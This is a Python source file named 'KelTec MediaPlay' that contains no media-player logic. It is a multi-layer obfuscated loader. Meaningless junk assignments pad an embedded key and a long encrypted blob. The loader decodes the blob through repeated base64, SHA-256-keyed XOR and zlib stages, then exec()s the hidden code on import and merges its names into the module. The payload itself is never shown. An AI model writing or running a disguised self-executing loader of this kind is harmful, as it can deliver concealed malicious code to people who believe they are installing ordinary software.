# -*- coding: utf-8 -*-
# KelTec MediaPlay

_lx0_0 = 894394 ^ 819329
_lx1_1 = len("42bfd7")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-104620)
_lx3_3 = 343508 * 0
_lx4_4 = 476296 ^ 507114
_K = '199527611fde5b11ac033767ab1afc3ba8337cab8917021da1e3da9f909bafbc'
_M = '+d1curbE1ZRhwlBgHe5+F8YN9wSabG5DEky94Opz4KOsjly6s9+Gx2+RUjYev3gXlQmlVZg5O0MSSL3n7yW2q6TeWrS52oPBb5IJ'
_D = 'ijGnuoEIUeB87XgNq8w2Yhv6c6Fcmzz0fTk2KyrfWy2HSMOHJvsz8lIOo33hIKSy9cwFV24QbfQVEN0Rk2e9MmxljNdAZcgqLECngiK8BAaUMpz8/fmpb/9/d52RpXOqdD4DNJgB1SjSlutJRctnMkrHZAp5fm5xKzmshYD6AFi69xxM3iiXAj0GbK8PQPGYqCFjtDjXVE39ilJpJX0PqG2Kn9F/iLF4g2acyPgjKE0ruecKTiJZZy8AS9kmxqf5xtCiUglXrLmlttgz2lLlcB8dVWN8HY98PZqfFqITEMDsUJP9Bw+hZGlzhd+CuUHyrlR+1pefB4IISOo4WrKSsqvgxaWgLqaFWzXyEceIaIGOGbxFeHaJAjxI8EQVYuibT6V8UUvT5UvNCw57IQfAPb5KFUoRYm4gh/ewcyNxKh/esExgTk7HvQygOWCwTm3w9zPEOQAc6u75NsdODK/g/Phczt0hX5keXJwjHUOuTUe+7UGQrOpAQrfX+exm/0qE0WUnFLSPiU7na/McZF4TMXkQIYyvuE+GmgNayoJYKCAJr8/0OaMq+/RD3iUQWLmjMG3lwgFWrMPWDUqODI9UZGMgxVU3n4vGN6wYcS2S9U9XP2ItPjBMot0ePyikXESERCgYGeEtOa16cykDayKeWyBi5v5gAByK8/p0LbuLPlCDW7DtjYTIFzQWNSE81X5Y/sJLXH2fAWxMy4IyqL38cSK1wNv0CY+4W3pviujU+r/L/ebPaFDh7evfinJ0AWlJRE4ELLxCyI2BD+QEXqiXtrUiyL1tDOcjUsgFDzhmuGRE1ZkNsomDArjbda3De+zXMQKbH5RV5c3PSJISBwdMPZEYjmzbA4CCmIQyUAAX39VeKblHAay9xQLj+LqkIAY1zOMQNcAFuK2qZwNSVjFmc9K2+70f33ohv6xdx3WXtuDxbP1LC3IwCEKUeV8W2WXkgUKGkLUwqFipVrVla648Em2TojUoPKT0LBBsLtIEHKWdxtCJrKV7lV793+DWDe6Kt0MMmqJi3eWp5JGEdsBVAIRrGnNo1bNF9+M+1jOMoauRkD686uLVRTJGNumubvGIlsi0o8l7zTIF4GWoWAnJZBFZeecqPjqDR2MDadyJcG/4/XJL8jPXXkeZO5yb0lyThBDC5ukQ+SqvCxKaW8GweCTpmjJjj5oZh9NmUbK4MfCrxIz/tPGcYSIxo5HiniWDNuwIaGxwlmkBh6w7Npgu4shQpBoNKfREZgxhgzE1204d2JoEVvb+/q5hHENZ5pqIhpco4x5zM1DkaS5gFzLoMuNn8FfbzJluESPL+knD/Ze9K3FCoum+s42l7RYOM5llnWEita5NIrDkw9XBi/GQctLkCq+YvZ4YFu0HuOFS+lHl/cavmRPi80QwZJZMpoimZu8+T+u7eeh5V31ls3t9i06RRtZvKkrhTHpQKV8aEEzDJr3NkT7PXohG6+4jOCSenFc8VmGq4AbADVcuJFjDeu8SXT4fYY7JfvS84Ys/fXfupynGxEBjRMlOTzMXvN05NdV3zkagZ57MZlQPkykcM0xYnFd4vcp3UU5IFU7k4ahBOKSWjOklCbz5wYQpzNwVsAp+CtrOSt/6JBJx+P72Q7PeG0QyGpJoEsEl'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})